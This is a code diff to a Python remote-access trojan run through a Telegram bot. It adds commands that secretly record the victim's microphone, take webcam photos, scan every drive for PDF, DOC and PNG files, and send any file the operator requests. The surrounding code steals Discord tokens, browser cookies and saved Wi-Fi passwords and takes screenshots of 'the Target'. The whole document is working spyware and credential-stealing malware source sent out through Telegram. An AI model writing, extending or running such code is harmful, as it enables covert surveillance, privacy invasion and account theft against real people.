@@ -6,21 +6,24 @@ import winreg
 import os
 import time
 import subprocess, re
+import win32api
+import cv2
+
+import sounddevice as sd
+import soundfile as sf
 
 from functions.hardware import get_tasks, get_system_info
 from functions.browser import get_browser_cookies
 
-
 get_tasks()
 get_system_info()
 
-
-TOKEN = 'yourtokken'
-COMMAND_ID = 'channel-command-id'
-AUTOSPY_GROUP_ID = 'auto-screen-id'
+TOKEN = 'UwU'
+COMMAND_ID = 'UwU'
+AUTOSPY_GROUP_ID = ''
 AUTOSPY_INTERVAL = 300
-
 bot = telebot.TeleBot(TOKEN)
+
 
 def send_screenshot_loop(bot):
     while True:
@@ -78,6 +81,95 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
+
+@bot.message_handler(commands=['record'])
+def record_audio(message):
+    duration = 10  # Recording duration
+    sample_rate = 44100  # Hz
+    channels = 2  # Number of channels (1 for mono, 2 for stereo)
+
+    bot.send_message(message.chat.id, "Recording audio...")
+    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels)
+    sd.wait()
+    audio_file = 'recording.wav'
+    sf.write(audio_file, recording, sample_rate)
+
+    with open(audio_file, 'rb') as f:
+        bot.send_voice(message.chat.id, f)
+    os.remove(audio_file)
+
+
+
+@bot.message_handler(commands=['scandata'])
+def scandata(message):
+    pdf_files = []
+    doc_files = []
+    png_files = []
+
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
+        for root, dirs, files in os.walk(drive):
+            for file in files:
+                if file.endswith('.pdf'):
+                    pdf_files.append(os.path.join(root, file))
+                elif file.endswith('.doc') or file.endswith('.docx'):
+                    doc_files.append(os.path.join(root, file))
+                elif file.endswith('.png'):
+                    png_files.append(os.path.join(root, file))
+
+    if pdf_files or doc_files or png_files:
+        result = ""
+        if pdf_files:
+            result += "PDF files:\n\n" + "\n".join(pdf_files) + "\n\n"
+        if doc_files:
+            result += "DOC files:\n\n" + "\n".join(doc_files) + "\n\n"
+        if png_files:
+            result += "PNG files:\n\n" + "\n".join(png_files) + "\n\n"
+        bot.send_message(message.chat.id, result)
+    else:
+        bot.send_message(message.chat.id, "No PDF, DOC, or PNG files found.")
+
+
+@bot.message_handler(commands=['webcam'])
+def take_screenshot(message):
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        bot.send_message(message.chat.id, "Unable to open webcam.")
+        return
+
+    ret, frame = cap.read()
+    if not ret:
+        bot.send_message(message.chat.id, "Unable to capture screenshot.")
+        return
+    file_name = "uwu.jpg"
+    cv2.imwrite(file_name, frame)
+
+    if os.path.isfile(file_name):
+        with open(file_name, 'rb') as f:
+            bot.send_photo(message.chat.id, f)
+        os.remove(file_name)
+    else:
+        bot.send_message(message.chat.id, "Unable to save screenshot.")
+    cap.release()
+
+
+
+@bot.message_handler(commands=['download'])
+def download_file(message):
+    bot.send_message(message.chat.id, "Please enter the full file path of the file you want to download:")
+    bot.register_next_step_handler(message, send_file)
+
+def send_file(message):
+    try:
+        file_path = message.text
+        if os.path.isfile(file_path):
+            with open(file_path, 'rb') as f:
+                bot.send_document(message.chat.id, f)
+        else:
+            bot.send_message(message.chat.id, "File not found or invalid file path.")
+    except Exception as e:
+        bot.send_message(message.chat.id, "An error occurred while sending the file: " + str(e))
+
+
 @bot.message_handler(commands=['discord'])
 def send_discord_tokens(message):
     local = os.getenv('LOCALAPPDATA')
@@ -111,11 +203,12 @@ def send_discord_tokens(message):
     os.remove('discord_tokens.csv')
 
 
+
+
 @bot.message_handler(commands=['chatid'])
 def send_chat_id(message):
     chat_id = message.chat.id
     bot.send_message(chat_id, f"This chat/group's ID is: {chat_id}")
-
 
 @bot.message_handler(commands=['wifi'])
 def get_wifi_password(message):
@@ -149,6 +242,7 @@ def get_wifi_password(message):
     except subprocess.CalledProcessError:
         bot.send_message(message.chat.id, "No saved Wi-Fi profiles found.")
 
+
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_text = "Available commands:\n\n"
@@ -158,8 +252,13 @@ def send_help(message):
     help_text += "📷 /screenshot - Take a screenshot of the Target\n"
     help_text += "📋 /tasks - Get all tasks in CSV format\n"
     help_text += "📡 /wifi - Get saved Network data.\n"
+    help_text += "📷 /webcam - Selfie time?\n"
+    help_text += "📁 /datascan - Scan for [pdf, docs, png...]\n"
+    help_text += "📁 /download - Download the files\n"
+    help_text += "🎤 /record - Record for 10sec the Mic\n"
     help_text += "🆔 /chatid - Get the current Chat/Group ID\n"
     bot.send_message(COMMAND_ID, help_text)
+
 
 @bot.message_handler(commands=['browsercookies'])
 def send_browser_cookies(message):
